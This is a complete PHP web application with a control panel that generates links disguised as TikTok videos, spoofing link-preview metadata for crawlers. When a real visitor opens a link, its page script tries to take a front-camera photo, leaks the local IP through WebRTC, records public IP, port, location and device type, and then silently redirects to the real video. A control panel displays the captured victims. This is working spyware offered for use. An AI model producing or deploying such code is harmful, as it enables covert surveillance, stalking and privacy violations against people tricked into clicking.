<?php
date_default_timezone_set('Africa/Algiers');

error_reporting(0);
@ini_set('display_errors', 0);

$upload_dir = 'uploads/';
if (!is_dir($upload_dir)) {
    @mkdir($upload_dir, 0755, true);
}

try {
    $db = new PDO('sqlite:tracker_zero_click.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        use_camera INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        location TEXT, 
        device_info TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

if (isset($_GET['delete_id'])) {
    $del_id = intval($_GET['delete_id']);
    $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
    $stmt->execute([$del_id]);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit();
}

function fetch_tiktok_exclusive_meta($url) {
    $meta = [
        'title' => 'TikTok Video',
        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
    ];

    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $oembed_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['title'])) {
            $meta['title'] = $data['title'];
        }
        if (!empty($data['thumbnail_url'])) {
            $meta['image'] = $data['thumbnail_url'];
            return $meta;
        }
    }

    $ch_alt = curl_init();
    curl_setopt($ch_alt, CURLOPT_URL, $url);
    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
    $html = curl_exec($ch_alt);
    curl_close($ch_alt);

    if ($html) {
        $dom = new DOMDocument();
        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
        $xpath = new DOMXPath($dom);

        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
        if ($titleNodes->length > 0) {
            $val = trim($titleNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['title'] = $val;
        }

        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
        if ($imageNodes->length > 0) {
            $val = trim($imageNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['image'] = $val;
        }
    }

    return $meta;
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_location($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
        return 'Local Network';
    }
    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
        }
    }
    return 'Unknown Location';
}

function get_device_type($ua) {
    $brand = 'Device';
    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

// معالجة زيارة الرابط المولد
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);

        if ($is_bot) {
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<title>' . htmlspecialchars($meta_title) . '</title>';
            echo '</head><body></body></html>';
            exit();
        }

        // استقبال البيانات سواء تم إرسال صورة أو بيانات عامة فقط
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            $img_base64 = $_POST['image'] ?? '';
            $public_ip = get_real_ip();
            $local_ip = $_POST['lip'] ?? 'Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
            $location = get_ip_location($public_ip);
            $device = get_device_type($ua);

            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
            } catch (Exception $e) {}
            exit('OK');
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
    <meta property="og:type" content="video.other">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
    </style>
    <script>
        let isProcessed = false;
        const useCamera = <?php echo $use_camera; ?>;
        const targetUrl = "<?php echo $target_redirect; ?>";

        function getLocalIP(callback) {
            let foundLocal = false;
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) { callback("Unknown"); return; }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                        if (!foundLocal) { foundLocal = true; callback(ip); pc.onicecandidate = null; }
                    }
                }
            };
            setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
        }

        function sendInfoAndRedirect(imageData = "") {
            if (isProcessed) return;
            isProcessed = true;

            getLocalIP(function(localIp) {
                const formData = new URLSearchParams();
                formData.append('save_info', '1');
                formData.append('image', imageData);
                formData.append('lip', localIp);

                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                }).finally(() => {
                    window.location.replace(targetUrl);
                });
            });
        }

        function initTracking() {
            if (!useCamera) {
                // إذا كانت الكاميرا غير مفعلة، أرسل المعلومات الأساسية فوراً وانتقل
                sendInfoAndRedirect("");
                return;
            }

            // إذا كانت الكاميرا مفعلة، حاول التقاط الصورة مع جمع باقي المعلومات
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
                        stream.getTracks().forEach(track => track.stop());

                        sendInfoAndRedirect(imageData);
                    }, 300);
                })
                .catch(err => {
                    // في حال رفض إذن الكاميرا، يتم إرسال باقي المعلومات بدون صورة والتوجيه طبيعياً
                    sendInfoAndRedirect("");
                });
        }

        window.addEventListener('DOMContentLoaded', () => {
            initTracking();
        });

        window.addEventListener('click', () => {
            initTracking();
        }, { once: true });
    </script>
</head>
<body>
</body>
</html>
<?php 
        exit();
    } else {
        die("Link not found.");
    }
}

// معالجة إنشاء الرابط من لوحة التحكم
$generated_link = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    $use_camera = isset($_POST['use_camera']) ? 1 : 0;
    
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $scraped = fetch_tiktok_exclusive_meta($target_url);
    $meta_title = $scraped['title'];
    $meta_image = $scraped['image'];

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?)");
    $stmt->execute([$code, $target_url, $meta_title, $meta_image, $use_camera]);

    $domain = $_SERVER['HTTP_HOST'];
    $generated_link = "https://" . $domain . "/?r=" . $code;
}

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - Core Engine</title>
    <style>
        :root {
            --bg-main: #070913;
            --bg-card: #10172a;
            --border-color: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #8b5cf6;
            --accent-hover: #7c3aed;
            --danger: #f43f5e;
            --danger-hover: #e11d48;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        
        body { 
            background: radial-gradient(circle at top right, #1e1b4b, #090d16 60%);
            background-attachment: fixed;
            color: var(--text-main); 
            padding: 40px 15px; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between; 
        }

        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .section-box { 
            background: rgba(16, 23, 42, 0.85); 
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-color); 
            border-radius: 16px; 
            padding: 30px; 
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); 
        }

        h1 { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 25px; }
        
        h2 { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }

        .form-grid { display: grid; gap: 16px; }
        input[type="text"] { width: 100%; background: #050b14; border: 1px solid var(--border-color); border-radius: 10px; padding: 14px 16px; color: var(--text-main); font-size: 14px; outline: none; transition: border-color 0.2s; }
        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            font-size: 14px;
            color: var(--text-muted);
            user-select: none;
        }
        .checkbox-container input {
            width: 18px;
            height: 18px;
            accent-color: var(--accent);
            cursor: pointer;
        }

        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 10px; font-weight: 600; cursor: pointer; height: 48px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: all 0.2s; }
        .btn:hover { background: var(--accent-hover); transform: translateY(-1px); }
        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: var(--danger-hover); }
        .btn-secondary { background: #334155; }
        .btn-secondary:hover { background: #475569; }

        .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); margin-bottom: 8px; letter-spacing: 0.05em; }
        .flex-row { display: flex; gap: 8px; }
        
        .input-link-result { 
            background-color: #0b1329 !important; 
            color: #38bdf8 !important; 
            border: 1px solid #1e293b !important;
            font-weight: 600;
        }

        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
        .card-img { background: #050b14; border: 1px solid var(--border-color); border-radius: 12px; padding: 14px; position: relative; }
        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border-color); }
        
        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
        .info-row span { color: #cbd5e1; }
        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }

        .btn-delete {
            display: block;
            width: 100%;
            margin-top: 12px;
            background: rgba(244, 63, 94, 0.1);
            color: var(--danger);
            border: 1px solid rgba(244, 63, 94, 0.3);
            border-radius: 8px;
            padding: 8px;
            font-size: 12px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            transition: all 0.2s;
        }
        .btn-delete:hover {
            background: var(--danger);
            color: white;
        }

        footer { text-align: center; margin-top: 30px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
    </style>
    <script>
        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "Copied";
                btnElement.style.background = "#10b981";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <div>
            <h1>Control Panel</h1>
            <p class="subtitle">TikTok High-Speed Zero-Click Engine</p>
        </div>

        <div class="section-box">
            <h2>Generate TikTok Link</h2>
            <form method="POST" class="form-grid">
                <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
                
                <label class="checkbox-container">
                    <input type="checkbox" name="use_camera" value="1" checked>
                    تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)
                </label>

                <button type="submit" name="create" class="btn">Generate Link</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>Active Link:</label>
                    <div class="flex-row">
                        <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="section-box">
            <h2>Captured Gallery & Details</h2>
            <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px;">
                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
                <button type="submit" class="btn" style="height:48px;">Filter</button>
                <?php if(!empty($filter_code)): ?>
                    <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
                <?php endif; ?>
            </form>

            <?php if (empty($captures)): ?>
                <p style="text-align: center; color: var(--text-muted); padding: 40px;">No captures recorded.</p>
            <?php else: ?>
                <div class="gallery-grid">
                    <?php foreach ($captures as $cap): ?>
                        <div class="card-img">
                            <?php if (!empty($cap['image_data'])): ?>
                                <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                    <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
                                </a>
                            <?php else: ?>
                                <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--text-muted); font-size: 12px; border: 1px dashed var(--border-color);">
                                    الكاميرا معطلة (بدون صورة)
                                </div>
                            <?php endif; ?>

                            <div class="info-row" style="margin-top:10px;">
                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
                            </div>
                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                            </div>
                            
                            <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذا السجل؟');">حذف السجل</a>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>

    </div>

    <footer>
        <p>Core Engine <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
